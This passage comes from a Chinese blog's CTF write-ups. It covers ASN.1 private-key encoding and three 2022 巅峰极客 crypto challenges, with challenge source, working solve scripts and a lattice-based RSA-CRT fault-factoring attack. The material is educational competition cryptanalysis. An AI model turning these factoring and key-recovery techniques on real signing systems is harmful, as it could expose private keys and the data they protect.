中， 0 号位为 02 表示整数， 1 号位 01 表示长度为 1 ， 2 号位 00 表示数据为 0 ，这就是上面提到的私钥文件结构中的那个 0 。<br>再继续分析， 3 号位 02 表示数据为整数， 4 号位中的首比特为1表示使用长格式，后面 7 个比特为 000 0001 意为数据长度用 1 个字节表示，没错就是后面紧跟的 5 号位，表示数据长度为 0x81 ，转换成 10 进制就是 129 ，试了一下 6 - 134 号位用 <code>bytes_to_long</code> 解析出来的数据，也是 $n$<br>那么现在你应该也可以尝试写出 $e$ 的编码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\x02\\x03\\x01\\x00\\x01</span><br></pre></td></tr></table></figure>\n\n<p>细心的你还发现我开头扔了 4 个字节，猜猜是啥呢？<br>答案是整个私钥文件编码后作为值域前面补的标签域和长度域，最前面再补一个 0 ，也就是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0\\x82\\x02^</span><br></pre></td></tr></table></figure>\n\n<p>后两个字节 <code>bytes_to_long</code> 解码后是 606 ，恰为后面跟的完整数据的长度</p>\n<blockquote>\n<p>后来偶然间发现竟然有类似的题目（）<br><a href=\"https://ctftime.org/task/2127\">0CTF 2016 Quals equation</a></p>\n</blockquote>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://mp.weixin.qq.com/s/A9OmgHAmGLJPEL4cQBU8zQ\">https://mp.weixin.qq.com/s/A9OmgHAmGLJPEL4cQBU8zQ</a><br><a href=\"https://www.likecs.com/show-40060.html\">https://www.likecs.com/show-40060.html</a></p>"},{"title":"2022巅峰极客 Crypto","date":"2022-08-18T04:47:00.000Z","_content":"\n有瓜吃，美滋滋。\n<!--more-->\n\n题目质量一般，知识问答还全是搬运今年 ciscn 的。\n然后三个队友都没啥空，就我一个做了两道密码，排 88 名，对我这个菜鸡来说也还行吧。\n\n## point-power\n\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\nfrom random import *\nfrom secrets import flag\n\nassert len(flag)==42\np=getPrime(600)\na=bytes_to_long(flag)\nb=randrange(2,p-1)\nE=EllipticCurve(GF(p),[a,b])\nG=E.random_element()\n\nx1,y1,_=G\nG=2*G\nx2,y2,_=G\n\nprint(f\"p = {p}\")\nprint(f\"b = {b}\")\nprint(f\"x1 = {x1}\")\nprint(f\"x2 = {x2}\")\n'''\np = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623\nb = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147\nx1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740\nx2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727\n'''\n```\n\n这题完全是现学现卖，之前只听说过椭圆曲线，然后就跑去学抽代忘记回来了。。。\n首先查到椭圆曲线的加法（两点相同的情形）：\n$$\nx_2=m^2-2x_1\\ (mod\\ p) \\ with \\ m=\\frac{3x_1^2+a}{2y_1}\n$$\n又在Sagemath文档查到曲线定义 $y_1^2=x_1^3+ax_1+b$ ，就能联立出一个一元二次方程， exp 如下：\n\n```python\np = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623\nb = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147\nx1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740\nx2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727\n\nK = GF(p)\nn=(K(x2+2*x1)).sqrt()\nP.<x>= PolynomialRing(K)\nA=1\nB=6*x1**2-4*n**2*x1\nC=-(4*n**2*x1**3+4*n**2*b-9*x1**4)\nf=A*x**2+B*x+C\nroots=f.roots()\nprint(roots)\nflag=roots[1][0]\nfrom Crypto.Util.number import *\nprint(long_to_bytes(int(flag)))\n```\n\n## strange curve\n\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\nfrom secrets import flag\nimport random\n\ndef add(P,Q):\n    (x1,y1)=P\n    (x2,y2)=Q\n\n\n    x3=(x1+x2)*(1+y1*y2)*invert((1+x1*x2)*(1-y1*y2),p)%p\n    y3=(y1+y2)*(1+x1*x2)*invert((1-x1*x2)*(1+y1*y2),p)%p\n\n    return (x3,y3)\n\ndef mul(e,P):\n    Q=(0,0)\n    e=e%p\n    while e:\n        if e&1:\n            Q=add(Q,P)\n        P=add(P,P)\n        e>>=1\n    return Q\n\ndef Legendre(a,p):\n    return (pow((a%p+p)%p,(p-1)//2,p))%p\n\ndef get_ts(p):\n    p=p-1\n    count=0\n    while p%2==0:\n        count+=1\n        p=p//2\n    return count,p\n\ndef get_nonre(p):\n    a=random.randint(1,p)\n    while Legendre(a,p)==1:\n        a=random.randint(1,p)\n    return a\n\ndef amm2(a,p):\n    t,s=get_ts(p)\n    ta=pow(get_nonre(p),s,p)\n    tb=pow(a,s,p)\n    h=1\n    for i in range(1,t):\n        d=pow(tb,2**t-1-i,p)\n        if d==1:\n            k=0\n        else:\n            k=1\n        tb=(tb*pow(ta,2*k,p))%p\n        h=(h*pow(ta,k,p))%p\n        ta=pow(ta,2,p)\n    return h*pow(a,(s+1)//2,p)%p  \n\ndef solve(a,b,c,p):\n    tmpa=1\n    tmpb=b*inverse(a,p)%p\n    tmpc=c*inverse(a,p)%p\n    assert Legendre(tmpb**2*inverse(4,p)-tmpc,p)==1\n    res1=(amm2(tmpb**2*inverse(4,p)-tmpc,p)-tmpb*inverse(2,p))%p\n    res2=(-amm2(tmpb**2*inverse(4,p)-tmpc,p)-tmpb*inverse(2,p))%p\n    return (res1,res2)\n\ndef lift(x,a,b,p):\n    tmp=b*(x**2-1)*inverse(a*x,p)%p\n    return solve(1,-tmp,-1,p)[0]\n\np=9410547699903726871336507117271550134683191140146415131394654141737636910570480327296351841515571767317596027931492843621727002889086193529096531342265353\na=54733430689690725746438325219044741824500093621550218736194675295708808435509\nb=75237024593957256761258687646797952793573177095902495908321724558796076392871\nx=bytes_to_long(flag)\n\nwhile True:\n    try:\n        y=lift(x,a,b,p)\n        break\n    except:\n        x+=1\n        continue\n\nassert a*x*(y**2-1)%p==b*y*(x**2-1)%p\n\nP=(x,y)\ne=65537\n\neP=mul(e,P)\nprint(f\"P = {P}\")\nprint(f\"eP = {eP}\")\n'''\nP = (56006392793427940134514899557008545913996191831278248640996846111183757392968770895731003245209281149, 5533217632352976155681815016236825302418119286774481415122941272968513081846849158651480192550482691343283818244963282636939305751909505213138032238524899)\neP = (mpz(8694229840573103722999959579565187489450818138005222030156495740841851804943200684116883831426548909867463656993852596745698999492932194245562062558787005), mpz(9279986963919197374405152604360936066932975197577643570458423456304679111057526702737279809805694360981565554506626018364382736924914907001214909905449002))\n'''\n```\n\n这题真的是蚌不住，刚放出来解出数就蹭蹭往上涨，还有点怀疑人生，然后仔细观察题目，一看上面，什么玩意，再看下面，什么玩意。。。\n直接拿第一个数 `long_to_bytes` ，得到flag。\n\n## Learning with fault\n\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\nfrom secrets import flag\nimport os\n\nclass RSA():\n    def __init__(self,p,q,e):\n        self.p=p\n        self.q=q\n        self.e=e\n        self.phi=(p-1)*(q-1)\n        self.d=invert(self.e,self.phi)\n        self.dp=self.d%(p-1)\n        self.dq=self.d%(q-1)\n        self.n=p*q\n        self.N=getPrime(512)*getPrime(512)\n\n    def sign(self,message):\n        m=bytes_to_long(message)\n        sig_p=pow(m,self.dp,self.p)\n        sig_q=pow(m,self.dq,self.q)\n        alpha=q*invert(q,p)\n        beta=p*invert(p,q)\n        return long_to_bytes((alpha*sig_p+beta*sig_q)%self.n)\n\n    def corrupt_sign(self,message):\n        m=bytes_to_long(message)\n        sig_p=pow(m,self.dp,self.p)\n        sig_q=pow(m,self.dq,self.q)\n        alpha=q*invert(q,p)\n        beta=p*invert(p,q)\n        return long_to_bytes((alpha*sig_p+beta*sig_q)%self.N)\n\n    def verify(self,message,sign):\n        return long_to_bytes(pow(bytes_to_long(sign),self.e,self.n))==message\n\np=getPrime(512)\nq=getPrime(512)\ne=65537\nrsa=RSA(p,q,e)\n\nwith open(\"sign.txt\",\"w\") as f1:\n    with open(\"corrupted_sign.txt\",\"w\") as f2:\n        for _ in range(6):\n            message=os.urandom(64)\n            sign=rsa.sign(message)\n            corrupted_sign=rsa.corrupt_sign(message)\n            assert rsa.verify(message,sign)\n            f1.write(str(sign)+'\\n')\n            f2.write(str(corrupted_sign)+'\\n')\n\nenc=pow(bytes_to_long(flag),rsa.e,rsa.n)\nprint(f\"n = {rsa.n}\")\nprint(f\"N = {rsa.N}\")\nprint(f\"e = {rsa.e}\")\nprint(f\"enc = {enc}\")\n'''\nn = 99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729\nN = 81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731\ne = 65537\nenc = 2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396\n'''\n```\n\n出题论文：<https://eprint.iacr.org/2011/388.pdf>\n这题一开始是搜到了论文，瞟了两眼，以为不是，就没看下去了。。。\n后来学长发给我这篇，我焯了两个钟复现出来了，说不定真有机会现场解出，唉还是太菜。\n照着论文的 Attack Summary 敲就行了，一开始没理解到 $z$ 向量的意思，直接从格子拿，跑不出来，学长问我 $a$ 和 $b$ 的选取是不是有问题，我才知道要枚举出所有 $x$ 和 $y$ 。然后 $a$ 和 $b$ 在 0 到 10 间选取也不行，改成了 -10 到 10 。\nexp 如下：\n\n```python\nfrom tqdm import tqdm\nfrom itertools import combinations\nfrom sage.all import *\nfrom Crypto.Util.number import *\nco_sig = [b\"\\x17\\x8bb3\\x11\\x1b\\xb9\\xb9\\xc6M\\xb0\\xaa\\x07-\\x1ar\\xff\\xfb\\xb4&H7!\\xb8\\xa1\\xce\\x07\\x8b\\x84M\\x0bw=m\\x193Oc\\x97w\\x8f\\xffy4\\xa1\\x99\\xfcW\\xf9|\\xeb\\xa4\\x00\\x1eD*\\xe8-'\\xa9\\xef\\x9d\\x13*\\xf4\\xbe\\x9d\\x9b&w\\xcb\\xfd\\xb3\\xb6\\xa3n\\xb8\\xb4\\x97vT\\xec@\\x86\\xd1R\\xb0\\n\\xe1uC\\xbc\\x14\\xeb\\xceSu&'{\\xb9\\x12\\x90\\x82\\xc7,\\xdbr\\xebP\\xe1j\\x11E\\xd5\\x17\\xe1\\xd0D\\xe7z\\x94vt\\xbf\\x1a\\xc4+\",\n          b'\\x1dJ\\xc5\\xb2\\xbe\\x05\\xe6\\xc8T\\n\\xbe\"\\xbeU\\xed\\xba\\xec\\x85\\x05\\x8b\\x8ayE\\xa3}0\\x1dk\\xa7\\x10\\xe2E\\x19\\xfe\\x10\\x90\\xef\\r\\xdbV\\x8b\\x87|(\\xd1\\xb5\\xfd\\xb9\\x14\\x84\\x05\\x03\\x81\\xc8\\xf6\\xe5\\x8a\\x92\\xa0\\x01I\\x8aG:\\xc19\\x9e\\xf0\\x8eZ\\\\Yx\\x80|\\xb7\\x80\\x0e\\xcd\\xa3\\xba6\\xf8\\x98\\xb1pB\\x05\\x8aT#\\xbf\\x1e\\x1b~\\xcb\\xf5\\t\\xa2H9\\xc9n\\x81e\\xa2\\x15\\x97\\x11\\xe4\\x93\\xf2\\xe6\\x80\\x97\\x99G\\xb5\\xfe\\x07/\\xd2\\xbd\\xad\\xcf\\x04\\x9e\\xd0',\n          b'Gs\\xda\\xb8\\x8a\\x85\\xccK\\xf7\\xa8y\\x16\\xa5\\xf0\\x06\\xbe\\xeb\\x83&}a\\x85q\\x8d:\\x1fSb\\xb8\\xc5\\x84\\xba*[\\xe7\\xbb{\\x86\\xd3\\xb3r\\xb6\\xaaCN\\x93\\x1d<(\\xe2\\x1c;\\x8crU\\x8fD=W\\xa7\\x0b\\xc7\\xeag\\x96\\x06\\xd6\\xbb\\xe4\\x04b\\xd8\\x02\\x12\\xd6\\xfa2\\x1e#\\xf0\\xde\\x8b\\x88M\\xd2\\xf47\\\\\\x98\\xe0\\x04Fu\\x1bsy\\xf2\\xc4\\xad\\xd6Y\\x81u~B:\\xd2\\x1f\\xb3\\xab\\x01:\\xfa\\xdf\\x19J8\\xd0\\x18RN\\xfe,CA\\x15\\xb3\\xe0',\n          b\"0I\\xda5\\x9f\\x05v\\x17\\xdc\\xd4q\\xd6\\x83,\\x9d\\r\\xccc\\x8a\\xa1\\xd4U\\xd3\\x18\\xc9\\xc6g\\xcd\\nX\\x99Ah\\xed}\\xf3\\xb1(\\xd5I\\xc6\\x0f@yw9\\x9d\\xfdv\\x15x\\xeaRA\\xd6\\xb0\\x1e\\xb5B\\xe5\\x05cc\\x06m\\xf4NN'\\x02q\\x1a\\x11\\xe4\\x87P:\\xc8\\x11a\\x9f\\xbd\\x9c\\x98x\\xda\\xea\\xc4\\xa8f\\x89s\\xcaJ\\x7f\\xeb\\xd8\\xc1G#\\xf4\\xdc\\xe2\\x01\\xf2\\xa5\\x95\\x19`)2!\\xf5\\xb9\\xf0\\xf2\\xbb\\xf8\\x0bF&&`\\xfd*\\xe1\\xf2\\x9c\",\n          b':\\x99/Hxt\\xd1\\xd4\\xaaB\\xd6H\\x16\\xe1\\xc9\\xe2\\xb3\\xc3\\xa9b\\xd3\\x96\\x9c\\x05x6\\xf1\\xc3d\\xa2\\xd1U+.\\x1b\\xac^\\xf6Mh7\\xb7\\x03\\x8e\\xdc\\xca\\x0bn\\xac\\xed\\x92\\xb8x\\x04)\\x0f|\\x11\\xcc\\xfa\\xf2\\\\\\xba\\xee\\xc4X\\xa8(\\x05\\xf2\\xb5\\x8f&\\xf3\\xff\\x1eB\\xe7\\x94\\xf4\\xa6\\x00!\\xe5v\\xd9x\\xf0s\\x94\\xf4D(\\xa9g\\x118\\xa7z\\x83\\xad\\xdb\\xe6\\xe3\\xe7\\xf8\\xf2\\xef\\xe5@\\xe9\\x13\\x00OB\\xcc\\x05\\xd1,_=\\xd2/Og\\x81\\xa6+',\n          b'\\x1c|\\xb6\\xcc\\xdfj\\xc5\\xa0s\\xac w\\xa6\\xf2\\x87D\\xe3\\xf9Y\\xf5=\\xf0\\x0b\\xd9\\xea\\x89,+e\\x1e\\xb7m#\\x99\\xd1\\x87\\x17Z\\xed\\x1d\\xc8\\x97;\\xa0K\\x05.\\xaa<\\xc6s\\xcf\\xa2\\xa2\\\\PO\\x12&\\xb4\\x11\\xec\\xad\\x10\\xf8\\xf7\\xd1\\xd3_\\x80\\x17\\xe0\\x1eP\\x93\\xe3\\xc2\\x1e\\x03\\xea]^\\xc6a\\x9c\\xcb\\x90\\xbb\\x9f\\x8by\\xa5dhM\\xce\\xc7\\xbc\\xf7\\xafe\\xcf\\xc1\\xf1\\x18@\\x1e\\xe2\\xdb\\xfb\\xe4^\\xc8\\xe7\\x19\\xccnY\\xc6o\\x7fL\\x9fV\\xd4\\xc4\\x15\\xe8',\n          ]\nsig = [b'\\t\\x8b\\xde\\x98\\x84\\x1d\\x9e\\xd4\\xa0\\xb7f\\xe0\\x05\\xb1\\xbd8\\xb9G\\xe3\\x0c\\x83\\x8a\\xe5\\xf0G7\\x12\\x1eT\\x85o-B\\xe4_\\xd2\\x04\\xd9:\\xab\\xdf\\xa1 \\x8f\\xedt+\\x0f\\xce\\xb5\\x90\\xaaK\\xf0U~v=\\x84\\xe7$G\\xf5\\xfb\\xd3ok~V\\x1a\\xec&\\x15\\x18Y\\x0c\\x80u\\xafF\\xf1\\x10\\x9f\\xf2\\xe6\\xa6\\x9a\\xbb\\xbd+\\xa4l\\xa9\\x11\\xd5\\t\\x13\\x16\\xa3\\xde\\xe1\\xdfZ\\xa9$r\\xb5`\\xc9\"\\x11\\xab\\xc5\\x87\\xc4\\x1d@\\x9e\\xa4t\\xdb#\\xbdj\\xcb\\x95\\xefK',\n       b'z/\\xd6\\xfb\\xd8\\xfa\\xc4\\xed\\xbd\\x99\\xd0\\xa0\\x90\\xcb\\xca\\x83\\xd8B\\xa7\\xf4\\xbd\\xe0\\xc2&\\x1aQl(\\xd6p\\x8f\\x89=tT\\xf1(\\xeb\\xab\\x84[oR\\x1fl=\\xda\\xf5\\x18q\\x8f\\xa7k\\x00\\x1b\\x1a\\x0ei\\x1fa.ho\\x15\\x04\\x12\\xe4\\xc2\\xd7\\x19\\x92\\xc3\\x9b\\xfe\\xd5\\xb6R\\xf8\\x95\\x9fr\\x93\\xddD\\x1c[\\x873\\xd5\\x06\\x1b\\xa5\\x82/6\\x9a\\x13\\xcf\\xa4\\xcd\\x0e]\\t\\xad?\\xd6\\x84\\r\\x90\\xef\\x86\\xf15)\\xe34\\xf7\\xb77\\xef\\x0c&\\xdb8\\xa6\\xe0\\xa5a',\n       b'U\\x0b\\xf6\\x9cm])1\\xe2\\xad\\xf9G\\x8f\\xa2\\xbc}\\xd7\\x18\\x89\\xa4\\xfdFQ\\x80m\"\\xf9\\to^\\xd9A\\x98\\xd2\\xca\\x1e(b\\xa8\\xbe\\xc2m\\xf7\\n[O\\x00\\xbc\\x87\\x17\\xed\\x0cG\\xf2=H\\x0e\\xc0\\x14+\\xcb\\xd0\\x1feT2\\xf2Th\\xec\\xc2\\xcf>6,<\\x88X\\x8f\\xe9g\\xa8\\x00\\xafr\\x05\\x95\\rj\\x9c\\xc6\\n\\xbb\\x8a\\x019\\xc1\\x1ef#\\x02[Rh\\xd8\\xdc|{6\\xeb\\xe8U\\x91\\xa4\\xeb}\\xf4s;E\\xe72$i\\xdft\\xff\\'',\n       b'[\\x94\\x95T\\xf4\\xc4\\xca\\x8drO\\x80\\x14\\xc9<H\\xa2a\\xdc\\xf4`\\xac>\\xab\\x03\\xfa\\x80Sx\\x99\\x14\\x83$U\\x0b\\xfa\\x8fv\\xfd\\xda\\x1a\\xa0\\xebY\\xaa\\x01\\xe2XsG\\t\\xcf\\xae\\xa0\\xbf\\x82iG\\tQ \\xb1\\xfe\\xa5k\\x12\\xd9\\x12\\xf7\\x95\\xa3\\xa5\\x8d`z\\x19\\x1a\\x90-\\x9aj\\x15\\xf6f>\\x18\\x08\\xb8\\x1f\\x88\\x1a\\x80Th\\xd0\\x15\\x9bw#\\'`K\\xa5\\xf1\\xbf\"\\xe79\\xaf\\xc7z%p\\xa5\\x9f\\x14\\xef\\'1\\x11\\x05Gg\\xe9\\xda\\xc9\\x18~[',\n       b':\\xefRE\\xd7\\xa1?\\xf3\\xb5\\xf7\\xdd\\xe2\\xb6~\\x85014\\xc0\\x8a\\x80\\xe1\\xb5#\\x94\\x10\\xb2\\xa0\\xfe\\x87\\xd1t\\xc3$&\\xde8\\x195\\xcd\\xf4@3\\x15\\xcaK\\xcc\\xcd\\r:\\x83*\\xd7l\\xb6\\xf2} \\tJ\\xb5xKfjh.\\xfb\\xb5\\x91\\xc6\\xf2x\\x8e\\x83\\xdc\\xc3\\xef\\x8b\\x8dW\\xa6\\xa6\\xb0w\\xd8\\xf2G\\xa5-\\xc3\\x87\\x17;\\xedH`:\\xcd\\x08ts\\x9eqPE\\xd7\\xfc\\xc4\\x98\\xb5\\xe0\\xad\\xb7A\\x7f\\xcb\\x01\\xbd\\x98\\xd3Ea\\xb9\\x07\\x80\\xf8\\x19',\n       b\"8\\xca\\x7f!;\\\\\\xde\\x1b\\x80i\\x9b!\\x1c??u\\x13\\x955\\xd0xG\\xff\\xd7\\xba\\xfe+\\x95\\x0eu^\\x15\\x1a\\x0e*\\xfe\\x8a\\xafM\\xc0\\xd1Ty\\xd7\\xf1\\xa7@\\xd6\\xa6\\xee\\x0c:It\\x1a\\xeag\\xfc\\x0c\\xaf\\x02<\\x03T)\\xeb\\xb0\\x15\\x1cz\\x85\\x992\\xa9\\xbe\\x9bm\\xc4D\\x83\\xf7\\xb5T\\xdd9?\\x94\\xd4\\x13\\xb4\\xb3\\x8d\\xa9\\x92\\x9dt\\x86\\xdb\\x0b$\\x19l\\xb1\\xb9\\x05'o\\xf3!\\t\\x01\\x93'z\\x15P\\x88\\xd7iN\\n\\x8bA\\xb5\\xd2}\\xe8\\x10\"\n       ]\nn = 99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729\nN = 81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731\ne = 65537\nenc = 2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396\n\n\ndef orthogonal_lattice(B):\n    _d, _n = B.nrows(), B.ncols()\n    _c = 2 ** min(((_n-1)/2+(_n-_d)*(_n-_d-1)/4), 20)\n    for b in B:\n        _c *= b.norm()\n    B_bot = (ceil(_c)*B).stack(identity_matrix(ZZ, _n))\n    B_r = B_bot.transpose().LLL()\n    LB = B_r.matrix_from_rows_and_columns(range(_n-_d), range(_d, _n+_d))\n    assert (B*LB.transpose()).is_zero()\n    return LB\n\n\nv = [crt([bytes_to_long(co_sig[i]), bytes_to_long(sig[i])], [N, n])\n     for i in range(6)]\n\nLv = orthogonal_lattice(matrix(ZZ, v))\n\nresult = orthogonal_lattice(Lv.matrix_from_rows(range(0, 6-2)))\n\nfor x, y in combinations(result, 2):\n    for a in tqdm(range(-10, 10)):\n        for b in range(-10, 10):\n            z = a*x+b*y\n            if z.norm() > sqrt(6*n):\n                continue\n            else:\n                vv = vector(v)-z\n                for i in vv:\n                    if gcd(i, n) != 1:\n                        p = gcd(i, n)\n                        assert n % gcd(i, n) == 0\n                        q = n//p\n                        phi = (p-1)*(q-1)\n                        d = inverse_mod(e, phi)\n                        m = long_to_bytes(int(pow(enc, d, n)))\n                        print(m)\n                        exit()\n```\n\n### 原理\n\nRSA-CRT签名中计算了：\n$$\n\\sigma_p=\\mu(m)^d\\mod \\ p \\\\\\\\  \\sigma_q=\\mu(m)^d\\mod \\ q\n$$\n然后签名 $\\sigma=\\sigma_p\\cdot\\alpha+\\sigma_q\\cdot\\beta$ ，其中 $\\alpha=q\\cdot(q^{-1}\\mod\\ p)$ ， $\\beta=p\\cdot(p^{-1}\\mod\\ q)$ 。\n题目中给出 6 对签名，每对签名用 CRT 不难算出\n$$\nv=\\sigma_p\\cdot\\alpha+\\sigma_q\\cdot\\beta \\mod N\\cdot N'\n$$\n其中 $\\sigma_p$ 和 $\\sigma_q$ 和 $N/2$ 一个数量级， $\\alpha$ 和 $\\beta$ 又和 $N$ 一个数量级，故右式远小于 $N\\cdot N'$ ，那么**上式在整数域上是成立的**。\n一对算不出，但是多对可以，组成向量，有：\n$$\n\\boldsymbol{v}=\\alpha\\boldsymbol{x}+\\beta\\boldsymbol{y}\n$$\n其中 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 是分量 $n/2$ 位的未知向量， $\\alpha$ 和 $\\beta$ 是有关 $p$ 和 $q$ 的 CRT 系数。\n不难计算出一组与 $\\mathbb{Z}^\\ell$ 中正交于 $\\boldsymbol{v}$ 的向量的格 $\\boldsymbol{v}^\\bot \\in \\mathbb{Z}^\\ell$ 的约化基 $\\{\\boldsymbol{b}_1,...,\\boldsymbol{b}\\_{\\ell-1}\\}$ 。（可能此时你会疑惑为什么是 ${\\ell-1}$ 个向量，下面的拓展里有解释）\n特别地，我们有：\n$$\n\\alpha \\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle + \\beta \\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle = 0 \\quad \\mathrm{for} \\ j=1,2,\\ldots,\\ell-1\n$$\n~~（也不是很特别的感觉）~~\n现在观察方程 $\\alpha\\cdot u+\\beta\\cdot v=0$ ，最小的非零解 $(u,v)\\in \\mathbb{Z}^2$ 是 $\\pm(\\beta,-\\alpha)/g$ ，其中 $g=\\gcd(\\alpha,\\beta)$ 盲猜是非常小的（经测试基本在10以内），意味着 $|u|,|v|\\geq\\mathit{\\Omega}(N)$ 中 $\\mathit{\\Omega}$ 常量是非常小的。（啥玩意？）对 $j=1,2,\\ldots,\\ell-1$ ，有以下两种可能：\n\n**情形1**：$\\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle = \\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle = 0$ 。此时 $\\boldsymbol{b}_j$ 属于 $\\mathbb{Z}^\\ell$ 中与 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 正交的向量的格 $L=\\{\\boldsymbol{x},\\boldsymbol{y}\\}^\\bot$\n\n**情形2**：$\\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle$ 和 $\\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle$ 有绝对值 $\\geq \\mathit{\\Omega}(N)$ ，其中 $\\mathit{\\Omega}(N)$ 是一个小常数。因为 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 的范数都不超过 $\\sqrt{\\ell N}$ ，由柯西-施瓦茨不等式，这意味着 $||\\boldsymbol{b}_j||\\geq \\mathit{\\Omega}(\\sqrt{\\ell N})$\n\n因为格 $L=\\{\\boldsymbol{x},\\boldsymbol{y}\\}^\\bot$ 的秩是 $\\ell-2$ ，当全部 $\\ell-1$ 个向量 $\\boldsymbol{b}\\_j$ 线性无关时情形1不成立，所以最长的 $\\boldsymbol{b}\\_{\\ell-1}$ 应该在情形2中，因此 $||\\boldsymbol{b}\\_{\\ell-1}||\\geq \\mathit{\\Omega}(\\sqrt{\\ell N})$ 。另一方面，其他向量形成一个秩为 $\\ell-2$ 的格，且体积\n$$\nV=\\mathrm{vol}(\\mathbb{Z}\\boldsymbol{b}\\_1\\oplus\\cdots\\oplus\\mathbb{Z}\\boldsymbol{b}\\_{\\ell-2})\\approx\\frac{\\mathrm{vol}(\\boldsymbol{v}^\\bot)}{||\\boldsymbol{b}\\_{\\ell-1}||}=\\frac{||\\boldsymbol{v}||}{||\\boldsymbol{b}\\_{\\ell-1}||}\\leq \\frac{\\sqrt{\\ell}\\cdot N^{3/2}}{\\mathit{\\Omega}(\\sqrt{N/\\ell})}=O(\\ell N)\n$$\n盲猜是一个随机的格。特别地，我们有：\n$$\n||\\boldsymbol{b}\\_j||=O(\\sqrt{\\ell-2}\\cdot V^{1/(\\ell-2)})=O(\\ell^{1/2+1/(\\ell-2)}\\cdot N^{1/(\\ell-2)})\\quad\\mathrm{for} \\ j=1,2,\\ldots,\\ell-2\n$$\n\n一旦 $\\ell \\geq 5$ ，这个长度就远小于 $\\sqrt{N/\\ell}$ 。假设是这种情况，那么对于 $j=1,2,...,\\ell-2$ ， $\\boldsymbol{b}\\_j$ 应该是情形1中。这意味着这些向量生成 $L=\\{\\boldsymbol{x},\\boldsymbol{y}\\}^\\bot$ 中一个满秩的子格 $L'=\\mathbb{Z}\\boldsymbol{b}\\_1\\oplus\\cdots\\oplus\\mathbb{Z}\\boldsymbol{b}_{\\ell-2}$ 。\n取正交格，我们得到 $(L')^\\bot \\supset L^\\bot=\\mathbb{Z}\\boldsymbol{x}\\oplus\\mathbb{Z}\\boldsymbol{y} $。因此， $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 属于 $L'$ 的正交格 $(L')^\\bot$ 。令 $\\{\\boldsymbol{x'},\\boldsymbol{y'}\\}$ 为一组该格的约化基，我们可以枚举 $(L')^\\bot$ 中的长度不超过 $\\sqrt{\\ell N}$ 且为 $\\boldsymbol{x'}$ 和 $\\boldsymbol{y'}$ 线性组合的所有格向量。高斯启发式表明这大约为：\n$$\n\\frac{\\pi(\\sqrt{\\ell N})^2}{\\mathrm{vol}((L')^\\bot)}=\\frac{\\pi\\ell N}{V}=O(1)\n$$\n这样的向量，所以这肯定是可行的。对这些向量 $\\boldsymbol{z}$ ，我们计算 $\\gcd(\\boldsymbol{v}-\\boldsymbol{z},N)$ 。我们将因此很快在其中找到 $\\gcd(\\boldsymbol{v}-\\boldsymbol{x},N)$ ，因为 $\\boldsymbol{x}$ 是一个 $(L')^\\bot$ 中长度 $\\leq\\sqrt{\\ell N}$ 的向量。但根据 $\\boldsymbol{v}$ 的定义，我们有：\n$$\n\\boldsymbol{v}=\\boldsymbol{x}\\mod p\\\\\\\\\n\\boldsymbol{v}=\\boldsymbol{y}\\mod q\n$$\n故 $\\gcd(\\boldsymbol{v}-\\boldsymbol{x},N)=p$ ，从而分解 $N$ 。\n\n### 拓展阅读-正交格\n\n令 $\\mathbf{b}_1,...,\\mathbf{b}_d$ 为 $\\mathit{\\Lambda}$ （这玩意念Lambda）中的向量。如果这 $d$ 个向量在 $\\mathbf{Z}$ 上线性无关且 $\\mathit{\\Lambda}$ 